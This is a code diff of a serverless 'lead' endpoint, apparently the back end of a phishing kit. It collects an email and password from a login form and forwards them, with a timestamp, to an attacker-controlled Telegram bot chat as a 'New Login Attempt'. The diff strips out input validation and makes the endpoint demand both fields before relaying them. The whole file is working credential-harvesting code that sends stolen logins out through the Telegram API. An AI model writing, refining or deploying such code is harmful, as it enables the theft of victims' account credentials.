@@ -1,72 +1,63 @@
-import { z } from 'zod';
-
-const leadSchema = z.object({
-  email: z.string().email('Invalid email format'),
-  password: z.optional(z.string().min(8, 'Password too short')),
-  message: z.string().optional()
-});
-
+// api/lead.js
 export default async function handler(req, res) {
+  // Allow CORS
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+
+  if (req.method === 'OPTIONS') {
+    return res.status(200).end();
+  }
+
   if (req.method !== 'POST') {
     return res.status(405).json({ success: false, error: 'Method not allowed' });
   }
 
   try {
-    const validatedData = leadSchema.parse(req.body);
-    const { email, password, message } = validatedData;
+    const { email, password, message } = req.body;
 
-    // Step 1: Just Email received
-    if (!password) {
-      return res.status(200).json({ success: true, message: 'Email received.' });
+    if (!email || !password) {
+      return res.status(400).json({ success: false, error: 'Email and password required' });
     }
 
-    // Step 2: Password received -> SEND TO TELEGRAM
-    if (password) {
-      // ✅ THE SECRET IS HERE (Fetched from Vercel Environment Variables)
-      const telegramToken = process.env.TELEGRAM_BOT_TOKEN;
-      const telegramChatId = process.env.TELEGRAM_CHAT_ID;
+    const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+    const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-      if (!telegramToken || !telegramChatId) {
-        console.error('❌ Missing Telegram credentials in Vercel settings');
-        return res.status(500).json({ success: false, error: 'Server configuration error.' });
-      }
-
-      const telegramMessage = `🔐 *New Login Attempt*\n\n📧 *Email:* ${email}\n🔑 *Password:* ${password}\n📝 *Note:* ${message || 'None'}`;
-      
-      try {
-        const telegramResponse = await fetch(
-          `https://api.telegram.org/bot${telegramToken}/sendMessage`,
-          {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: telegramChatId,
-              text: telegramMessage,
-              parse_mode: 'Markdown'
-            })
-          }
-        );
-
-        const result = await telegramResponse.json();
-
-        if (!telegramResponse.ok) {
-          console.error('Telegram API Error:', result);
-          return res.status(500).json({ success: false, error: 'Failed to send Telegram message.' });
-        }
-
-        return res.status(200).json({ success: true, message: 'Login successful. Check Telegram.' });
-
-      } catch (telegramError) {
-        console.error('Network error to Telegram:', telegramError);
-        return res.status(500).json({ success: false, error: 'Telegram service unavailable.' });
-      }
+    if (!BOT_TOKEN || !CHAT_ID) {
+      return res.status(500).json({ success: false, error: 'Server config missing' });
     }
+
+    const text = `
+🔐 *New Login Attempt*
+📧 *Email:* ${email}
+🔑 *Password:* ${password}
+⏰ *Time:* ${new Date().toLocaleString()}
+    `.trim();
+
+    const response = await fetch(
+      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text,
+          parse_mode: 'Markdown'
+        })
+      }
+    );
+
+    const data = await response.json();
+
+    if (!data.ok) {
+      console.error('Telegram API Error:', data);
+      return res.status(500).json({ success: false, error: 'Telegram failed' });
+    }
+
+    return res.status(200).json({ success: true, message: 'Sent to Telegram' });
 
   } catch (error) {
-    console.error('Backend validation error:', error);
-    if (error instanceof z.ZodError) {
-      return res.status(400).json({ success: false, error: error.errors[0].message });
-    }
-    return res.status(500).json({ success: false, error: 'Internal server error' });
+    console.error('Server Error:', error);
+    return res.status(500).json({ success: false, error: 'Internal error' });
   }
-          }
+  }
